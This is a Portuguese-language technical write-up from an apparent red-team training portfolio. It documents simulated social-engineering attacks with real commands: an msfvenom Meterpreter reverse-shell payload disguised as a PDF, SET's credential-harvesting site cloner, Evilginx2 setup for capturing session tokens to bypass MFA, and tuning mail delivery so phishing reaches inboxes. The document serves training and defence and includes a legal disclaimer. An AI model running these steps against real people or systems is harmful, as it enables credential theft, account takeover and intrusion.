# 🛠️ Tools & Technical Implementation

Este documento descreve as ferramentas, técnicas e comandos utilizados para simular ataques de Engenharia Social em ambiente **controlado e educacional**, conforme descrito no README principal do projeto.

---

## 🏗️ 1. Vetor: Spear Phishing (Cenário Lutheria)

### 🎯 Framework de Orquestração: Gophish

O **Gophish** foi utilizado para centralizar a gestão da campanha, permitindo:

- Criação de templates de e-mail  
- Gerenciamento de alvos  
- Rastreamento de telemetria (abertura e cliques)

### Setup Inicial no Ubuntu

```bash
chmod +x gophish
./gophish
# Acesso administrativo via: https://localhost:3333

### 💣 Geração de Payload: MSFVenom

Para simular o anexo malicioso (o suposto *"Guia de Vernizes"*), foi utilizado o gerador de payloads do Metasploit.

#### Comando para Payload Reverso (Simulado)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.XX \
LPORT=4444 \
-f pdf > guia_lutheria_protegido.pdf

> **Nota Técnica:**  
> Em operações reais de Red Team, payloads em PDF puros são facilmente detectados.  
> Aqui, o objetivo é demonstrar **a lógica da conexão reversa via `LHOST` / `LPORT`**, e não evasão avançada.


## 📱 2. Vetor: Smishing & Credential Harvesting (Cenário Delivery)

### 🧬 Clonagem de Interface: Social-Engineer Toolkit (SET)

O **SET** foi utilizado para criar uma réplica da página de login do serviço de delivery, simulando a coleta de credenciais em ambiente controlado.

#### Fluxo de Configuração

```text
setoolkit
 ➔ Opção 1 (Social-Engineering Attacks)
 ➔ Opção 2 (Website Attack Vectors)
 ➔ Opção 3 (Credential Harvester Attack Method)
 ➔ Opção 2 (Site Cloner)

#### 🎯 Alvo da Clonagem

- URL do serviço de delivery legítimo

### 🔓 Bypass de MFA: Evilginx2 (Avançado)

Para cenários onde o alvo possui **MFA/2FA ativado**, foi utilizado o **Evilginx2** como um Man-in-the-Middle (MitM) para capturar cookies de sessão (*Session Tokens*) em ambiente controlado.

#### Comandos de Configuração

```bash
sudo ./evilginx2
config domain seu-dominio-fake.com
config ip 1.2.3.4
phishlets hostname delivery_app login.seu-dominio-fake.com
phishlets enable delivery_app

## 🔍 3. Higiene de Infraestrutura (Red Team Ops)

Um ataque de phishing falha se o e-mail não chega à caixa de entrada.  
A reputação do domínio e do IP é crítica.

### 📋 Checklist de Entrega

- **SPF / DKIM / DMARC**  
  Verificados via **MXToolbox** para garantir a legitimidade do servidor de envio.

- **Mail-Tester**  
  Utilizado até atingir **pontuação 10/10** antes do disparo da campanha.

## 🛡️ Mirror Project: Blue Team (Defesa & Resposta)

Este exercício faz parte de uma abordagem **Purple Team**.

Toda a documentação sobre como **detectar, mitigar e bloquear** os ataques listados acima (incluindo):

- Logs de SIEM  
- Regras de EDR  
- Hardening de identidade  
- Playbooks de resposta a incidentes  

está disponível no repositório de defesa:

👉 **Portfólio Blue Team: Remediação & Hardening**


## ⚖️ Legal & Ethical Disclaimer

Este projeto tem finalidade **exclusivamente educacional e profissional**, voltado para:

- Estudos de Red Team  
- Simulações controladas  
- Treinamento defensivo (Blue / Purple Team)

### ⚠️ Aviso Importante

- ❌ Nenhuma técnica aqui documentada deve ser usada contra sistemas, pessoas ou organizações **sem autorização formal e expressa**.  
- ❌ O uso indevido dessas técnicas é crime e pode resultar em **responsabilidade civil e penal**.  
- ✅ Todo o conteúdo é aplicado apenas em **laboratórios, CTFs, ambientes de teste ou com permissão legal**.

> O autor não se responsabiliza por qualquer uso indevido das informações aqui contidas.

